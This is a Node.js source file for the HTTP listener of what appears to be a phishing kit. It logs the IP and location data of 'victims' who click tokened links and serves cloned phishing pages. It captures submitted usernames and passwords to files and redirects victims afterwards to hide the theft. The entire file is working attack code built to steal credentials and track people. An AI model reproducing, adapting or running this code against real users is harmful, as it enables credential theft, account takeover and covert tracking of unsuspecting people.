const http = require('http');
const url = require('url');
const qs = require('querystring');
const api = require('./api');
const sess = require('./session');
const fileOps = require('./fileOperations.js');
const CONFIG = require('./config/options');

function store_ip(ip){
	api.getIpInfo(String(ip),function ip_info_callback(ip_data){
		if(ip_data){ 
			fileOps.storeIpInfo(ip_data);
			console.log(`Info:The data for ${ip} has been stored in file ${__dirname}/victim_data/ip_info/${ip}.json`);
		}
	});	
}

function getResponse(q,ip,response){
	var valid_id = q["/?id"];
	if( sess.hasOwnProperty(valid_id) ){
		console.log('Info:Valid token found in request.'); 
		if(sess[valid_id].mode==='info' ){
			console.log("Bazinga!! IP captured",ip);
			store_ip(String(ip));
			response([301, {'Location': sess[valid_id].redirect_url}]);
		}
			
		else if(sess[valid_id].mode==='phish'){	//serve phishing page
			fileOps.serve_local_file(sess[valid_id].local_url,function reply(data){
				if(data==='redirect') response([301, {'Location': CONFIG.REDIRECT.REDIRECT_URL}]);
				else response([data[0], data[1], data[2], 'utf-8']);	
			});
		}
			
	}

	else{
		console.log('Info:Token value not present in session.json for this request!');
		response([301, {'Location': CONFIG.REDIRECT.REDIRECT_URL}]);
	 	//Default redirect
	}		
			
	if(CONFIG.OPTIONS.ALLOW_WITHOUT_TOKEN===1){ //store IP no matter what
		console.log("Bazinga!! IP captured",ip);
		store_ip(String(ip));
		response([301, {'Location': CONFIG.REDIRECT.REDIRECT_URL}]);
		//Default redirect
	}

}


exports.listener = function(port,tunnel_url){
	http.createServer(function (req, res) {
		var url_id_value = qs.parse(req.url)["/?id"];
		var refer_id_value = 	qs.parse(req.headers.referer)[`${tunnel_url}/?id`];

		//*logger*/ console.log(`Route requested: ${req.url} \n and Referer is: `,req.headers.referer);
		//logger: console.log(req);
		var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress ||
     			(req.connection.socket ? req.connection.socket.remoteAddress : null);


		/*********************ROUTES***************/
		//1: for requests with token field
		if( url_id_value ){//means victim clicked
			getResponse(qs.parse(req.url),ip,function response(data){
				res.writeHead(data[0],data[1]);				
				(data[2] && data[3]) ? res.end(data[2], data[3]) : res.end();
				//res.end();
			});
		}


		//2: for phish creds which use POST, so store them (https://stackoverflow.com/q/4295782/)
		else if(req.method == 'POST'){ 
			var body='';
			req.on('data', function (data) {
				body += data;
    	        		// Too much POST data, kill the connection!
    	        		// 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
    	        		if (body.length > 1e6) req.connection.destroy();
    	    		});

			req.on('end', function () {
    	        		var post = qs.parse(body);
				if(post["username"] && post["password"]){
					console.log("BAZINGA! Phishing creds captured!!!");
					fileOps.storeCreds([post,ip]); //store credentials;
				}
				//if that token contains a redirect_url value too along with local_url
				if(sess[refer_id_value].redirect_url){
					res.writeHead(301, {'Location': sess[refer_id_value].redirect_url});
					res.end();
				}

				else{
					res.writeHead(301, {'Location': CONFIG.REDIRECT.REDIRECT_URL});
					res.end();
				}
    	    		});	
		}


		//3: for serving resources requested by the phishing page
			
		else if(sess.hasOwnProperty(refer_id_value)){ //check if ?id= value is genuine?
			var url_to_serve = `${sess[refer_id_value].local_url}`.replace("/index.html","");
			url_to_serve+=`${req.url}`;
			fileOps.serve_local_file(url_to_serve,function reply(data){
				if(data==='redirect'){
					res.writeHead(301, {'Location': CONFIG.REDIRECT.REDIRECT_URL});
					res.end();
				}
				
				else{
	 				res.writeHead(data[0], data[1]);
					res.end(data[2], 'utf-8');
				}
			});
		}

		//4: for any other request except those mentioned above
		else{
			const body = "Unable to process this request \nOr maybe it was not meant to be processed. BAZINGA!!";
			res.writeHead(200, {'Content-Length': Buffer.byteLength(body) ,'Content-Type': 'text/plain'});				
			res.end(body);	 		
		}

	}).listen(port);
};

